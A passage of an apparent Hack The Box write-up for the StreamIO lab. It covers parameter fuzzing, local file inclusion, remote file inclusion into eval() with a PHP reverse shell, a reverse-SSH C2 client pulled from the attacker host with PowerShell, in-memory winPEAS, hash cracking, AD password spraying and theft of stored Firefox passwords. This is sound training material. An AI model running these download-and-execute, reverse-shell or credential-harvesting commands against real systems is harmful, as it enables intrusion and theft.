 :: Header           : Sec-Fetch-Dest: document
 :: Header           : Sec-Fetch-Site: same-origin
 :: Header           : Sec-Fetch-User: ?1
 :: Header           : Host: streamio.htb
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Data             : username=FUZZ1&password=FUZZ2
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Login failed
________________________________________________

[Status: 302, Size: 4147, Words: 796, Lines: 111, Duration: 88ms]
    * FUZZ1: yoshihide
    * FUZZ2: 66boysandgirls..

:: Progress: [144/144] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

After login, I'm able to access admin panel

> https://streamio.htb/admin/

![](/assets/obsidian/88a925a6db3aa398480793794d741016.png)

### Admin panel to RCE

#### Fuzz parameters

The functions parameter worth a fuzz : `?user=`

![](/assets/obsidian/1274806d9c97731fd26b707477afe36a.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ ffuf -c -u 'https://streamio.htb/admin/?FUZZ=' -b 'PHPSESSID=o8j2vob90b8741me7hc64hqm1q' -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -fs 1678

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://streamio.htb/admin/?FUZZ=
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt
 :: Header           : Cookie: PHPSESSID=o8j2vob90b8741me7hc64hqm1q
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1678
________________________________________________

user                    [Status: 200, Size: 2073, Words: 146, Lines: 63, Duration: 207ms]
staff                   [Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 88ms]
debug                   [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 84ms]
movie                   [Status: 200, Size: 319875, Words: 15967, Lines: 10779, Duration: 118ms]
:: Progress: [107982/107982] :: Job [1/1] :: 467 req/sec :: Duration: [0:03:56] :: Errors: 0 ::
```

By requesting `debug` function, it says `this options is for developers only`

> https://streamio.htb/admin/?debug=

![](/assets/obsidian/569cf50899c0b9398d1b5209aaa24cc4.png)

#### Fuzz parameter values for debug (LFI)

Discovered arbitrary file read

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ ffuf -c -u 'https://streamio.htb/admin/?debug=FUZZ' -b 'PHPSESSID=o8j2vob90b8741me7hc64hqm1q' -w /opt/wordlists/OneListForAll/dict/vulnerability_discovery_short.txt -fs 1712

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://streamio.htb/admin/?debug=FUZZ
 :: Wordlist         : FUZZ: /opt/wordlists/OneListForAll/dict/vulnerability_discovery_short.txt
 :: Header           : Cookie: PHPSESSID=o8j2vob90b8741me7hc64hqm1q
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1712
________________________________________________

ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini [Status: 200, Size: 1804, Words: 95, Lines: 57, Duration: 86ms]
index.php               [Status: 200, Size: 1693, Words: 93, Lines: 47, Duration: 86ms]
:: Progress: [9496/9496] :: Job [1/1] :: 285 req/sec :: Duration: [0:00:33] :: Errors: 0 ::
```

It shows `ERROR` for `index.php`, it might be LFI (`include` function)

![](/assets/obsidian/6f8620c540a9d8e2451450c1abb09b34.png)

#### Get source code of index.php

Use php filter wrapper to get the source code of `index.php`

```php
php://filter/convert.base64-encode/resource=index.php
```

^b3993c

![](/assets/obsidian/39630f94455dedd267fc80fce3eff1bd.png)

Decoded :

There's a new **mssql** credential with user `db_admin`

```php
<?php
define('included',true);
session_start();
if(!isset($_SESSION['admin']))
{
	header('HTTP/1.1 403 Forbidden');
	die("<h1>FORBIDDEN</h1>");
}
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);

?>
<!DOCTYPE html>
<html>
[...]
		<div id="inc">
			<?php
				if(isset($_GET['debug']))
				{
					echo 'this option is for developers only';
					if($_GET['debug'] === "index.php") {
						die(' ---- ERROR ----');
					} else {
						include $_GET['debug'];
					}
				}
				else if(isset($_GET['user']))
					require 'user_inc.php';
				else if(isset($_GET['staff']))
					require 'staff_inc.php';
				else if(isset($_GET['movie']))
					require 'movie_inc.php';
				else 
			?>
		</div>
	</center>
</body>
</html>
```

It's not vulnerable to php filter chain RCE

![](/assets/obsidian/5c4302446e1a4987929c46b801b94105.png)

#### Ceorce NTLM auth

```bash
POST /admin/?debug=\\10.10.14.21\x\ok.png HTTP/2
```

```bash
[SMB] NTLMv2-SSP Client   : 10.129.62.191
[SMB] NTLMv2-SSP Username : streamIO\yoshihide
[SMB] NTLMv2-SSP Hash     : yoshihide::streamIO:a1c1bb5bb2ca7f36:5E896099310CDBB9C26D90306879B602:01010000000000000091638E064ADA01F0A88056386699560000000002000800440032004600580001001E00570049004E002D00430048004B0048005A003700420047005A003600320004003400570049004E002D00430048004B0048005A003700420047005A00360032002E0044003200460058002E004C004F00430041004C000300140044003200460058002E004C004F00430041004C000500140044003200460058002E004C004F00430041004C00070008000091638E064ADA0106000400020000000800300030000000000000000000000000210000EF450137A103452CC16151F8003018E74838EFDB22CF707A164F8B33C16B01450A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320031000000000000000000
```

The hash isn't crackable

```bash
hashcat loot/responder.hash /opt/wordlists/rockyou.txt
```

#### Dump all php files in /admin/

Crawl accessible php files with **feroxbuster**

```bash
feroxbuster -k -u https://streamio.htb/admin/ -t 100 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x "php" -r -o ferox_443_admin_php.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ cat ferox_443_admin_php.txt | awk '{print $6}' | unfurl -u paths | grep 'php$'
/admin/index.php
/admin/master.php
```

Save the debug function request from burp repeater to file

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ cat download.req
POST /admin/?debug=php://filter/convert.base64-encode/resource=..FUZZ HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=o8j2vob90b8741me7hc64hqm1q
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Origin: https://streamio.htb
Referer: https://streamio.htb/admin/?movie=
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Dnt: 1
Sec-Gpc: 1
Te: trailers
```

Use the snippets from my LFI dumper [dfuf](https://github.com/opabravo/dfuf)

```bash
ffuf -c -request download.req -w <(cat ferox_443_admin_php.txt | awk '{print $6}' | unfurl -u paths | grep '.php$') -o ffuf.json -od ffuf
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ dfuf -o ffuf.json -od ffuf ffuf_dump
[+] Done! Extracted files saved to /home/kali/htb/StreamIO/ffuf_dump
```

Wrote a python script to base64 decode the dumped files

> `ffuf_dump_extract.py`

```python
import re
import base64
from pathlib import Path


ffuf_dump = Path('ffuf_dump')


for current_file in ffuf_dump.glob('**/*'):
    if current_file.is_file():
        with open(current_file, 'r') as f:
            content = f.read()
            b64 = re.findall(r'developers only(.*?)\t\t', content)
            if not b64:
                continue
            php_source = base64.b64decode(b64[0]).decode()
        with open(current_file, 'w') as f:
            f.write(php_source)
```

#### master.php

This php file is only accessible while being included, which is what `index.php` does

```php
if(!defined('included'))
	die("Only accessable through includes");
```

It will execute the file that was passed to `include` parameter in post data, that file could be passed from remote

```php
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```

#### RFI

Host web server

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ mkdir -p www&&cd www

┌──(bravosec㉿fsociety)-[~/htb/StreamIO/www]
└─$ python -m http.server 80
```

Since this is a windows machine, I will use `ivan-sincek`'s php web shell which supports windows

> https://github.com/ivan-sincek/php-reverse-shell

Since the code will be passed to `eval()`, I will remove `<?php` and `?>`

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO/www]
└─$ cp /opt/sectools/webshells/PHP/php-reverse-shell/src/reverse/php_reverse_shell.php rev.php

┌──(bravosec㉿fsociety)-[~/htb/StreamIO/www]
└─$ sed -i -e 's/127.0.0.1/10.10.14.21/' -e 's/9000/1111/' rev.php

┌──(bravosec㉿fsociety)-[~/htb/StreamIO/www]
└─$ sed -i -e 's/?>//' -e 's/<?php//' rev.php
```

Change GET to POST request in burp suite, then add `include` in post data

![](/assets/obsidian/e6a6a1d751e55f9b54e41ff5444302e8.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ rlwrap -cAr nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.21] from (UNKNOWN) [10.129.62.191] 63591
SOCKET: Shell has connected! PID: 1160
Microsoft Windows [Version 10.0.17763.2928]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\streamio.htb\admin>whoami
streamio\yoshihide
```


## Shell as nikk37


### Reverse SSH - Interactive shell

> https://github.com/NHAS/reverse_ssh

Start server

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/c2/reverse_ssh/bin]
└─$ ./server 0.0.0.0:443
2024/01/18 23:19:14 Loading files from /opt/sectools/c2/reverse_ssh/bin
2024/01/18 23:19:14 Version:  v2.4.1
2024/01/18 23:19:14 Listening on 0.0.0.0:443
2024/01/18 23:19:14 Loading private key from: /opt/sectools/c2/reverse_ssh/bin/id_ed25519
2024/01/18 23:19:14 Server key fingerprint:  fe76708014a97adea5673c27edf4800c7ec45dc51f90612dfb08593b0ebcd2e2
2024/01/18 23:19:14 Loading authorized keys from: /opt/sectools/c2/reverse_ssh/bin/authorized_keys
2024/01/18 23:19:14 Was unable to read webhooks configuration file
```

Build the client

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/c2/reverse_ssh]
└─$ RSSH_HOMESERVER=10.10.14.21:443 make
```

Link the client to web server

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO/www]
└─$ ln -s /opt/sectools/c2/reverse_ssh/bin/client.exe
```

Download and start the client

```bash
C:\inetpub\streamio.htb\admin>powershell iwr 10.10.14.21/client.exe -o \programdata\client.exe; \programdata\client.exe
```

Connect to the client, now I have **ssh**'s functionalities

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ ssh 127.0.0.1 -p 443 ls -t
                            Targets
+------------------------------------------+--------------------------+
| IDs                                      | Version                  |
+------------------------------------------+--------------------------+
| 42ead789a09ec20d05c3d1051b821158f1f1f0af | SSH-v2.4.1-windows_amd64 |
| 4560e76350de6d8c31090d0eabcd9a9da8c8c58b |                          |
| unknown.dc                               |                          |
| 10.129.62.216:63066                      |                          |
+------------------------------------------+--------------------------+

┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ ssh -J 127.0.0.1:443 42ead789a09ec20d05c3d1051b821158f1f1f0af
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\streamio.htb\admin> 
```

### Enumeration

Start winpeas in background while manually enumerating

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ nc -lvnp 1111 | tee -a winpeas.txt
listening on [any] 1111 ...
powershell -ep bypass
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "http://10.10.14.21/win/winpeas.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
```

`yoshihide` have `SeImpersonatePrivilege` token, which can be used for potato attacks to `NT Authority SYSTEM`, the section will be wrote in [Additional](#Additional) at the bottom

```bash
PS C:\inetpub\streamio.htb\admin> whoami /all

USER INFORMATION
----------------

User Name          SID
================== ==============================================
streamio\yoshihide S-1-5-21-1470860369-1569627196-4264678630-1107


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                                            Attributes
========================================== ================ ============================================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                         Well-known group S-1-5-3                                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                          Alias            S-1-5-32-568                                                   Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                                        Mandatory group, Enabled by default, Enabled group
IIS APPPOOL\streamio.htb                   Well-known group S-1-5-82-1528847198-758459563-1171150841-1721316123-2531113184 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                                       Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

`Martin` is the only non-default administrator

```bash
PS C:\inetpub\streamio.htb\admin> net user

User accounts for \\DC

-------------------------------------------------------------------------------
Administrator            Guest                    JDgodd
krbtgt                   Martin                   nikk37
yoshihide
The command completed successfully.

PS C:\inetpub\streamio.htb\admin> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
Martin
The command completed successfully.
```

### Enumerate MSSQL with db_admin

I've got `db_admin`'s credential from `/admin/index.ph`, now it's the time to use it

Port forward **mssql**

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ ssh -J 127.0.0.1:443 42ead789a09ec20d05c3d1051b821158f1f1f0af -L 1433:127.0.0.1:1433
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ mssqlclient.py 'db_admin':'B1@hx31234567890'@127.0.0.1
Impacket v0.12.0.dev1+20240111.174639.6c9a1aa - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC): Line 1: Changed database context to 'master'.
[*] INFO(DC): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (db_admin  db_admin@master)> enable_xp_cmdshell
ERROR: Line 1: You do not have permission to run the RECONFIGURE statement.
```

```bash
SQL (db_admin  db_admin@master)> enum_db
name              is_trustworthy_on
---------------   -----------------
master                            0

tempdb                            0

model                             0

msdb                              1

STREAMIO                          0

streamio_backup                   0
```

Now I can list `streamio_backup`'s tables, I didn't have enough permissions as `db_user` back then

```bash
SQL (db_admin  db_admin@master)> SELECT * FROM streamio_backup.INFORMATION_SCHEMA.TABLES;
TABLE_CATALOG     TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE
---------------   ------------   ----------   ----------
streamio_backup   dbo            movies       b'BASE TABLE'

streamio_backup   dbo            users        b'BASE TABLE'
```

This time the users are diffirent

```bash
SQL (db_admin  db_admin@master)> use streamio_backup;
SQL (db_admin  db_admin@streamio_backup)> select * from users;
id   username                                             password
--   --------------------------------------------------   --------------------------------------------------
 1   nikk37                                               389d14cb8e4e9b94b137deb1caf0612a

 2   yoshihide                                            b779ba15cedfd22a023c4d8bcf5f2332

 3   James                                                c660060492d9edcaa8332d89c99c9239

 4   Theodore                                             925e5408ecb67aea449373d668b7359e

 5   Samantha                                             083ffae904143c4796e464dac33c1f7d

 6   Lauren                                               08344b85b329d7efd611b7a7743e8a09

 7   William                                              d62be0dc82071bccc1322d64ec5b6c51

 8   Sabrina                                              f87d3c0d6c8fd686aacc6627f1f493a5
```

### Crack user hashes from backup

Extract users table to hashcat format

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ cat loot/users_backup.raw | awk '{print $2":"$3}' | sed -e 's/^:$//' -e '/^$/d' | tee loot/users_backup.hash
nikk37:389d14cb8e4e9b94b137deb1caf0612a
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332
James:c660060492d9edcaa8332d89c99c9239
Theodore:925e5408ecb67aea449373d668b7359e
Samantha:083ffae904143c4796e464dac33c1f7d
Lauren:08344b85b329d7efd611b7a7743e8a09
William:d62be0dc82071bccc1322d64ec5b6c51
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5
```

```bash
hashcat loot/users_backup.hash /opt/wordlists/rockyou.txt --user -m 0
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ hashcat loot/users_backup.hash /opt/wordlists/rockyou.txt --user -m 0 --show
nikk37:389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
```


### Password spray for AD

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ hashcat loot/users_backup.hash /opt/wordlists/rockyou.txt --user -m 0 --show > hashcat_users_backup.txt

┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ cat hashcat_users_backup.txt | cut -d: -f1 > users_bk.lst

┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ cat hashcat_users_backup.txt | cut -d: -f2 > pass_bk.lst
```

Got another user : `nikk37` available in AD

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ kerbrute userenum -d streamIO.htb --dc DC.streamIO.htb users_bk.lst -o kerbrute.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 01/19/24 - Ronnie Flathers @ropnop

2024/01/19 00:58:13 >  Using KDC(s):
2024/01/19 00:58:13 >   DC.streamIO.htb:88

2024/01/19 00:58:13 >  [+] VALID USERNAME:       nikk37@streamIO.htb
2024/01/19 00:58:13 >  [+] VALID USERNAME:       yoshihide@streamIO.htb
2024/01/19 00:58:13 >  Done! Tested 4 usernames (2 valid) in 0.114 seconds
```

Extract users to file

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ cat kerbrute.txt | grep -F '[+] VALID USERNAME' | awk '{print $7}' | awk -F'@' '{print $1}' > users_ad.lst
```

Merge all passwords gathered

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ cat pass.lst pass_bk.lst | sort -u > pass_sum.lst
```

Brute force password

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ /opt/sectools/ad/smartbrute/smartbrute.py brute -bU users_ad.lst -bP pass_sum.lst kerberos -d streamIO.htb

/opt/sectools/ad/smartbrute/smartbrute.py:1727: DeprecationWarning: Nesting argument groups is deprecated.
  kerberos_credentials = kerberos_secrets.add_argument_group("credentials to use")
[*] Starting bruteforce attack on passwords
┌──────────────┬────────┬──────────────────────────┬─────────┐
│ domain       │ user   │ password                 │ details │
├──────────────┼────────┼──────────────────────────┼─────────┤
│ streamIO.htb │ nikk37 │ get_dem_girls2@yahoo.com │         │
└──────────────┴────────┴──────────────────────────┴─────────┘
```

### Winrm

For some reasons, **runas** didn't work

```bash
PS C:\inetpub\streamio.htb\admin> runas /user:nikk37 "C:\programdata\client.exe"
Enter the password for nikk37:
Attempting to start C:\programdata\client.exe as user "streamIO\nikk37" ...
```

But winrm was successful

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ nxc winrm streamIO.htb -u 'nikk37' -p 'get_dem_girls2@yahoo.com'
WINRM       10.129.62.216   5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:streamIO.htb)
WINRM       10.129.62.216   5985   DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com (Pwn3d!)
```

Start reverse ssh client

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ nxc winrm streamIO.htb -u 'nikk37' -p 'get_dem_girls2@yahoo.com' -x '\programdata\client.exe'
WINRM       10.129.50.51    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:streamIO.htb)
WINRM       10.129.50.51    5985   DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com (Pwn3d!)
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ ssh -J 127.0.0.1:443 streamio.nikk37.dc
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\nikk37\Documents> whoami
streamio\nikk37
PS C:\Users\nikk37\Documents> cat ..\Desktop\user.txt
258d9004b4c638414dbcbd4d5caefd2c
```

# Root Flag
---

## Auth as JDgodd


### Enumeration

They are default shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ nxc smb streamIO.htb -u 'nikk37' -p 'get_dem_girls2@yahoo.com' --shares
SMB         10.129.50.51    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.129.50.51    445    DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com
SMB         10.129.50.51    445    DC               [*] Enumerated shares
SMB         10.129.50.51    445    DC               Share           Permissions     Remark
SMB         10.129.50.51    445    DC               -----           -----------     ------
SMB         10.129.50.51    445    DC               ADMIN$                          Remote Admin
SMB         10.129.50.51    445    DC               C$                              Default share
SMB         10.129.50.51    445    DC               IPC$            READ            Remote IPC
SMB         10.129.50.51    445    DC               NETLOGON        READ            Logon server share
SMB         10.129.50.51    445    DC               SYSVOL          READ            Logon server share
```

Run winpeas in background again

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ ssh -J 127.0.0.1:443 streamio.nikk37.dc | tee winpeas_nikk37.txt
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\nikk37\Documents> $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "http://10.10.14.21/win/winpeas.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program
]::Main("")
```

I like to run **ldapdomaindump** before bloodhound to get insight

```bash
ldapdomaindump -o ldapdomaindump -r streamIO.htb -u 'streamIO.htb\nikk37' -p 'get_dem_girls2@yahoo.com'
```

- Only two users can login with **WINRM**

![](/assets/obsidian/daf244f659f857485580ad09b0c44f5d.png)

- `Core Staff` is the only none-default group, it have no members

![](/assets/obsidian/b3ff89396bc7d653464dd774d7834621.png)

```bash
PS C:\Users\nikk37\Documents> whoami /all

USER INFORMATION
----------------

User Name       SID
=============== ==============================================
streamio\nikk37 S-1-5-21-1470860369-1569627196-4264678630-1106


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

### Firefox stored passwords

![](/assets/obsidian/b94e40da62ecc6508cc337247a5e6f3f.png)

I like to use **HackBrowserData** to harvest browser secrets

> https://github.com/moonD4rk/HackBrowserData

```bash
PS C:\Users\nikk37\Documents> iwr 10.10.14.21/win/hack-browser-data-windows-64bit.exe -o \programdata\h.exe
PS C:\Users\nikk37\Documents> \programdata\h.exe -b all -f json --dir results --zip
[NOTICE] [browser.go:47,pickChromium] find browser Yandex failed, profile folder does not exist
[NOTICE] [browser.go:47,pickChromium] find browser DC failed, profile folder does not exist
[NOTICE] [browser.go:47,pickChromium] find browser Opera failed, profile folder does not exist
[NOTICE] [browser.go:47,pickChromium] find browser Vivaldi failed, profile folder does not exist
[NOTICE] [browser.go:47,pickChromium] find browser Brave failed, profile folder does not exist
[NOTICE] [browser.go:47,pickChromium] find browser QQ failed, profile folder does not exist
[NOTICE] [browser.go:47,pickChromium] find browser Chrome Beta failed, profile folder does not exist
[NOTICE] [browser.go:47,pickChromium] find browser OperaGX failed, profile folder does not exist
[NOTICE] [browser.go:47,pickChromium] find browser 360speed failed, profile folder does not exist
[NOTICE] [browser.go:47,pickChromium] find browser Chromium failed, profile folder does not exist
[NOTICE] [browser.go:47,pickChromium] find browser CocCoc failed, profile folder does not exist
[NOTICE] [browser.go:47,pickChromium] find browser Sogou failed, profile folder does not exist
[NOTICE] [browser.go:47,pickChromium] find browser Chrome failed, profile folder does not exist
[NOTICE] [browser.go:47,pickChromium] find browser Microsoft Edge failed, profile folder does not exist
[NOTICE] [browser.go:98,pickFirefox] find browser firefox firefox-br53rxeg.default-release success
[NOTICE] [browsingdata.go:73,Output] output to file results/firefox_br53rxeg_default_release_password.json success
[NOTICE] [browsingdata.go:73,Output] output to file results/firefox_br53rxeg_default_release_bookmark.json success
[NOTICE] [browsingdata.go:73,Output] output to file results/firefox_br53rxeg_default_release_history.json success
[NOTICE] [main.go:65,func1] compress success
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ scp -J 127.0.0.1:443 streamio.nikk37.dc:'/Users/nikk37/Documents/results/results.zip' loot/
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ 7z l loot/results.zip

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
                    .....          987          330  firefox_br53rxeg_default_release_bookmark.json
                    .....         1045          292  firefox_br53rxeg_default_release_history.json
                    .....          546          195  firefox_br53rxeg_default_release_password.json
------------------- ----- ------------ ------------  ------------------------
                                  2578          817  3 files
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ 7z x loot/results.zip -o'loot/hack-browser-data'
```

`admin` uses `JDg0dd1s` as password, maybe they're the same user

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ cat loot/hack-browser-data/firefox_br53rxeg_default_release_password.json | jq .
[
  {
    "UserName": "JDgodd",
    "Password": "password@12",
    "LoginURL": "",
    "CreateDate": "2022-02-22T02:41:51-08:00"
  },
  {
    "UserName": "yoshihide",
    "Password": "paddpadd@12",
    "LoginURL": "",
    "CreateDate": "2022-02-22T02:41:24-08:00"
  },
  {
    "UserName": "nikk37",
    "Password": "n1kk1sd0p3t00:)",
    "LoginURL": "",
